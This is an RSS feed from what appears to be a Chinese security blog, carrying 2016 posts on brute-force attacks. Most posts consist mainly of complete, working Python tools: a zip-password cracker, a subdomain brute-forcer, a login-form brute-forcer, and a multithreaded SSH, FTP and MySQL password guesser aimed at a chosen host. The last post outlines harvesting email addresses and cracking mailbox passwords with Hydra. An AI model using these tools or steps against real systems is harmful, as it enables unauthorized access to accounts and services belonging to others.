<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>爆破 on </title>
    <link>http://wyb0.com/tags/%E7%88%86%E7%A0%B4/</link>
    <description>Recent content in 爆破 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Tue, 20 Sep 2016 14:50:59 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/%E7%88%86%E7%A0%B4/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Python爆破zip压缩包</title>
      <link>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4zip%E5%8E%8B%E7%BC%A9%E5%8C%85/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4zip%E5%8E%8B%E7%BC%A9%E5%8C%85/</guid>
      <description>

&lt;h3 id=&#34;0x00-代码:b937e6266634cef75fcb51fa109b76e7&#34;&gt;0x00 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;多线程爆破加密的zip压缩包&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import optparse
import zipfile
import threading
import Queue

queue = Queue.Queue()
lock = threading.Lock()
result = &#39;&#39;

def load_pwd(filename):
    for line in open(filename,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def bruter(zipname,queue):
    global result
    zFile = zipfile.ZipFile(zipname)
    while not queue.empty():
        password = queue.get()
        try:
            zFile.extractall(pwd=password) # 解压
            lock.acquire()
            print &amp;quot;[Ok] password is: %s&amp;quot; % password
            lock.release()
            result = password
        except:
            lock.acquire()
            print &amp;quot;[Error] password not is: %s&amp;quot; % password
            lock.release()
        queue.task_done()

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;zipfile&#39;,
        type=&#39;string&#39;, help=&#39;Target zip file.&#39;)
    parser.add_option(&#39;-p&#39;, &#39;--pfile&#39;, dest=&#39;pwdfile&#39;,default=&#39;pass.txt&#39;,
        type=&#39;string&#39;, help=&#39;Password file.&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--thread_num&#39;, dest=&#39;thread_num&#39;,default=60,
        type=&#39;int&#39;, help=&#39;Thread number.&#39;)

    (options, args) = parser.parse_args()

    if options.zipfile and options.pwdfile:
        load_pwd(options.pwdfile)
    else:
        parser.print_help()
        sys.exit(0)

    threads = []
    for x in range(options.thread_num):
        t = threading.Thread(target=bruter,args=(options.zipfile,queue,))
        t.setDaemon(True)
        t.start()
    queue.join()
    print &amp;quot;result is: %s&amp;quot; % result

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python爆破二级域名</title>
      <link>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/</link>
      <pubDate>Mon, 12 Sep 2016 21:31:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/</guid>
      <description>

&lt;p&gt;参考：&lt;a href=&#34;https://github.com/lijiejie/subDomainsBrute&#34;&gt;https://github.com/lijiejie/subDomainsBrute&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;帮助信息:25b6c2890e0e0ea19d70887c8b08669a&#34;&gt;帮助信息&lt;/h2&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sub_domain_blast_help.png&#34; alt=&#34;帮助信息&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h2 id=&#34;代码:25b6c2890e0e0ea19d70887c8b08669a&#34;&gt;代码&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import dns.resolver
import threading
import Queue
import optparse
import sys

queue = Queue.Queue()
lock = threading.Lock()

class GetSubDomain(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for SubDomain&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, target,queue,outfile):
        threading.Thread.__init__(self)
        self.target = target
        self.queue = queue
        self.rsv = dns.resolver.Resolver()
        outfile = target + &#39;.txt&#39; if not outfile else outfile
        self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;)
        self.ip_list = []

    def _scan(self):
        while not self.queue.empty():
            self.ip_list = []
            ips = None
            sub_domain = self.queue.get() + &#39;.&#39; + self.target
            for _ in range(3):
                try:
                    answers = self.rsv.query(sub_domain)
                    if answers:
                        for answer in answers:
                            if answer.address not in self.ip_list:
                                self.ip_list.append(answer.address)
                except dns.resolver.NoNameservers, e:
                    break
                except Exception, e:
                    pass
            if len(self.ip_list)&amp;gt;0:
                ips = &#39;,&#39;.join(self.ip_list)
                msg = sub_domain.ljust(30) + ips + &#39;\n&#39;
                lock.acquire()
                print msg
                self.f.write(msg)
                lock.release()
            self.queue.task_done()

    def run(self):
        self._scan()

def get_target(domain_list):
    targets = []
    for line in open(domain_list,&#39;r&#39;):
        if line:
            targets.append(line.strip())
    return targets

def get_sub_queue(sub_file): #得到所有子域名的queue
    for line in open(sub_file,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,
        type=&#39;string&#39;, help=&#39;Get a single top-level domain names.&#39;)
    parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;domain_list&#39;,
        type=&#39;string&#39;, help=&#39;Top-level domain name list.&#39;)
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;sub_file&#39;, default=&#39;sub.txt&#39;,
        type=&#39;string&#39;, help=&#39;Dict file used to brute sub names&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--threads&#39;, dest=&#39;threads_num&#39;, default=60, 
        type=&#39;int&#39;, help=&#39;Number of threads. default = 60&#39;)
    parser.add_option(&#39;-o&#39;, &#39;--outfile&#39;, dest=&#39;outfile&#39;, default=None,
        type=&#39;string&#39;, help=&#39;Output file name. default is {target}.txt&#39;)

    (options, args) = parser.parse_args()
    if options.url:
        urls = [options.url]
    elif options.domain_list:
        urls = get_target(options.domain_list)
    else:
        parser.print_help()
        print &amp;quot;Example: &amp;quot;
        print &amp;quot;\tpython getsub.py -u baidu.com&amp;quot;
        print &amp;quot;\tpython getsub.py -l domain.txt -f sub.txt -t 50&amp;quot;
        sys.exit(0)

    for url in urls:
        get_sub_queue(options.sub_file)
        for x in xrange(1,options.threads_num+1):
            t = GetSubDomain(url,queue,options.outfile)
            t.setDaemon(True)
            t.start()
        queue.join()

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现表单爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E7%88%86%E7%A0%B4/</link>
      <pubDate>Mon, 05 Sep 2016 23:43:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;接收变量的php脚本如下:ce6886490f9a6e6169f210150773b52d&#34;&gt;接收变量的php脚本如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;//代码仅供测试
&amp;lt;?php
    $name = @$_POST[&#39;uname&#39;];
    $pass = @$_POST[&#39;upass&#39;];

    if (empty($name) or empty($pass)){
        header(&amp;quot;location:http://127.0.0.1:921/test/test/index.html&amp;quot;);
        exit();
    } else {
        if ($name === &#39;admin&#39; and $pass === &#39;123456&#39;){
            header(&amp;quot;location:http://127.0.0.1:921/test/test/sucess.html&amp;quot;);
        } else {
            header(&amp;quot;location:http://127.0.0.1:921/test/test/error.html&amp;quot;);
            exit();
        }
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;爆破表单的python脚本如下:ce6886490f9a6e6169f210150773b52d&#34;&gt;爆破表单的python脚本如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import hashlib
import requests
from Queue import Queue
import threading
from optparse import OptionParser
from time import sleep

lock = threading.Lock()
queue = Queue()
result = []

class FormBlast(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for FormBlast&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *arg):
        super(FormBlast, self).__init__()
        (options,args,queue) = arg
        self.url = options.url
        self.fname = options.fname
        self.fpass = options.fpass
        self.args = args
        self.queue = queue
        self.s = requests.Session()
        self.base_md5 = &#39;&#39;

    def get_payload(self, vname, vpass):
        dict2 = {}
        if self.args:
            for x in self.args:
                (key,value) = x.split(&#39;=&#39;)
                dict2[key] = value
        dict1 = {self.fname: vname, self.fpass: vpass}
        payload = dict(dict1, **dict2)
        return payload

    def get_md5(self, html):
        md5 = hashlib.md5()
        md5.update(html)
        return md5.hexdigest()

    def get_base_md5(self):
        proxy = {
            &#39;http&#39;: &#39;http://127.0.0.1:8080&#39;
        }
        payload = self.get_payload(&#39;1&#39;, &#39;1&#39;)
        resp = self.s.post(self.url, data=payload)
        resp.coding = resp.apparent_encoding
        html = resp.text
        self.base_md5 = self.get_md5(html)

                        
    def run(self):
        # global result
        self.get_base_md5()
        while not self.queue.empty():
            (user,pwd) = self.queue.get().split(&#39;:&#39;)
            payload = self.get_payload(user,pwd)
            try:
                resp = self.s.post(self.url, data=payload, timeout=10)
                resp.coding = resp.apparent_encoding
                code = resp.status_code
                html = resp.text
                curr_md5 = self.get_md5(html)

                if curr_md5 != self.base_md5 and code==200:
                    s = &amp;quot;[Ok] User:%s Pass:%s&amp;quot; % (user,pwd)
                    result.append(s)
                    lock.acquire()
                    print s
                    lock.release()
                    self.queue.task_done()
                else:
                    error = &amp;quot;[Error] User:%s Pass:%s&amp;quot; % (user,pwd)
                    lock.acquire()
                    print error
                    lock.release()
                    self.queue.task_done()
            except requests.exceptions.ConnectTimeout:
                self.queue.put(user+&#39;:&#39;+pwd)
            except:
                pass
        # print self.result


def get_content(filename):
    data = []
    with open(filename) as f:
        lines = f.readlines()
        for line in lines:
            data.append(line.strip())
    return data

def get_queue(list1, list2):
    for user in list1:
        for pwd in list2:
            queue.put(user+&#39;:&#39;+pwd)

def main():
    parser = OptionParser()
    parser.add_option(&#39;-u&#39;,&#39;--url&#39;,dest=&#39;url&#39;,
                        help=&#39;Get target url&#39;)
    parser.add_option(&#39;-n&#39;,&#39;--fname&#39;,dest=&#39;fname&#39;,
                        help=&#39;The user name in the form&#39;)
    parser.add_option(&#39;-p&#39;,&#39;--fpass&#39;,dest=&#39;fpass&#39;,
                        help=&#39;The pass name in the form&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--namefile&#39;,dest=&#39;namefile&#39;,default=&#39;namefile.txt&#39;,
                        help=&#39;The user name dictionary files&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;passfile.txt&#39;,
                        help=&#39;The password dictionary files&#39;)
    (options,args) = parser.parse_args()

    if options.url and options.fname and options.fpass and options.namefile and options.passfile:
        users = []
        pwds = []
        users = get_content(options.namefile)
        pwds = get_content(options.passfile)
        get_queue(users, pwds)

        for x in xrange(1,41):
            blast = FormBlast(options, args, queue)
            blast.setDaemon(True)
            blast.start()
        queue.join()

        sleep(3)
        print &amp;quot;########################################&amp;quot;
        for x in result:
            print x
    else:
        parser.print_help()


if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;结果:ce6886490f9a6e6169f210150773b52d&#34;&gt;结果&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/form_blast1.png&#34; alt=&#34;表单爆破1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/form_blast2.png&#34; alt=&#34;表单爆破2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;脚本:584a532418a1844143552a4b9dd71035&#34;&gt;脚本&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

&#39;this script can bruter ftp/ssh/mysql&#39;

__author__ = &#39;reber&#39;

import Queue
import threading
import time
import logging
import socket
from optparse import OptionParser
import paramiko
from ftplib import FTP
import MySQLdb

#################公有类#################
class CommonFun(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(CommonFun, self).__init__()

    def set_log(self,lname):
        logger = logging.getLogger(lname)
        logger.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;)
        ch.setFormatter(formatter)

        logger.addHandler(ch)

    def show_log(self, lname, msg):
        a = logging.getLogger(lname)
        a.debug(msg)

    def show_result(self, lname, rlist):
        if rlist:
            print &amp;quot;###################################################################&amp;quot;
            for x in rlist:
                self.show_log(lname,x)
        else:
            print &amp;quot;not found...&amp;quot;

#################SSH爆破模块#################
class SshBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for SshBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(SshBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        self.is_exit = False
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):        
        while not self.qlist.empty():
            if not self.is_exit:
                name,pwd = self.qlist.get().split(&#39;:&#39;)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
                    time.sleep(0.05)
                    ssh.close()
                    s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                    self.qlist.put(name + &#39;:&#39; + pwd)
                    time.sleep(3)
                except Exception, e:
                    error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################FTP爆破模块#################
class FtpBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for FtpBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(FtpBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                ftp = FTP()
                ftp.connect(self.host, 21, self.timeout)
                ftp.login(name, pwd)
                time.sleep(0.05)
                ftp.quit()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(1)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################MySQL爆破模块#################
class MysqlBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for MysqlBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(MysqlBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db=&#39;mysql&#39;, port=3306)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(3)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

def main():
    parser = OptionParser(usage=&#39;Usage: python %prog [options] type&#39;)
    parser.add_option(&#39;-i&#39;,&#39;--host&#39;,dest=&#39;host&#39;,help=&#39;target ip&#39;)
    parser.add_option(&#39;-o&#39;,&#39;--timeout&#39;,type=int,dest=&#39;timeout&#39;,default=5,help=&#39;timeout&#39;)
    parser.add_option(&#39;-t&#39;,&#39;--thread&#39;,type=int,dest=&#39;threadnum&#39;,default=10,help=&#39;threadnum&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--userfile&#39;,dest=&#39;userfile&#39;,default=&#39;username.txt&#39;,help=&#39;userfile&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;password.txt&#39;,help=&#39;passfile&#39;)

    (options, args) = parser.parse_args()

    if not args:
        parser.print_help()
        exit()

    if args[0]==&#39;ssh&#39;:
        if options.host:
            ssh = SshBruter(options, args)
            ssh.run()
        else:
            parser.print_help()
    elif args[0]==&#39;ftp&#39;:
        if options.host:
            ftp = FtpBruter(options, args)
            ftp.run()
        else:
            parser.print_help()
    elif args[0]==&#39;mysql&#39;:
        if options.host:
            mysql = MysqlBruter(options, args)
            mysql.run()
        else:
            parser.print_help()
    else:
        print &amp;quot;type must be ssh or ftp or mysql&amp;quot;

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;尝试爆破:584a532418a1844143552a4b9dd71035&#34;&gt;尝试爆破&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_help.png&#34; alt=&#34;帮助信息.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ssh.png&#34; alt=&#34;爆破SSH.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ftp.png&#34; alt=&#34;爆破FTP.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_mysql.png&#34; alt=&#34;爆破MySQL.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>theHarvester&#43;Hydra爆邮箱弱口令</title>
      <link>http://wyb0.com/posts/theHarvester&#43;Hydra%E7%88%86%E9%82%AE%E7%AE%B1%E5%BC%B1%E5%8F%A3%E4%BB%A4/</link>
      <pubDate>Thu, 12 May 2016 15:27:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/theHarvester&#43;Hydra%E7%88%86%E9%82%AE%E7%AE%B1%E5%BC%B1%E5%8F%A3%E4%BB%A4/</guid>
      <description>

&lt;h2 id=&#34;下载theharvester:aa547dad6517c60204d69e9d6d237c1c&#34;&gt;下载theHarvester:&lt;/h2&gt;

&lt;p&gt;可在这里[&lt;a href=&#34;https://github.com/laramies/theHarvester&#34;&gt;theHarvester&lt;/a&gt;]下载&lt;/p&gt;

&lt;h2 id=&#34;设置shadowsocks为全局模式:aa547dad6517c60204d69e9d6d237c1c&#34;&gt;设置Shadowsocks为全局模式:&lt;/h2&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/SS.png&#34; alt=&#34;设置SS为全局代理&#34;&gt;
&lt;/div&gt;


&lt;h2 id=&#34;运行theharvester:aa547dad6517c60204d69e9d6d237c1c&#34;&gt;运行theHarvester:&lt;/h2&gt;

&lt;p&gt;这一步得到邮箱然后做成字典user

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/theHarvester_help.png&#34; alt=&#34;查看theHarvester的帮助信息&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/theHarvester_getemail1.png&#34; alt=&#34;得到邮箱1&#34;&gt;
&lt;/div&gt;



&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/theHarvester_getemail2.png&#34; alt=&#34;得到邮箱2&#34;&gt;
&lt;/div&gt;


&lt;h2 id=&#34;kail上用dnsenum得到邮箱域名:aa547dad6517c60204d69e9d6d237c1c&#34;&gt;kail上用dnsenum得到邮箱域名:&lt;/h2&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dnsenum.png&#34; alt=&#34;dnsenum得到邮箱服务器域名&#34;&gt;
&lt;/div&gt;


&lt;h2 id=&#34;nmap确认端口开启:aa547dad6517c60204d69e9d6d237c1c&#34;&gt;nmap确认端口开启:&lt;/h2&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/nmap_-p.png&#34; alt=&#34;nmap确认邮箱服务器在运行&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;hydra爆密码:aa547dad6517c60204d69e9d6d237c1c&#34;&gt;Hydra爆密码:&lt;/h2&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/hydra1.png&#34; alt=&#34;hydra猜解密码&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/hydra2.png&#34; alt=&#34;hydra猜解到密码&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;尝试登陆:aa547dad6517c60204d69e9d6d237c1c&#34;&gt;尝试登陆:&lt;/h2&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sign_in.png&#34; alt=&#34;尝试登陆&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>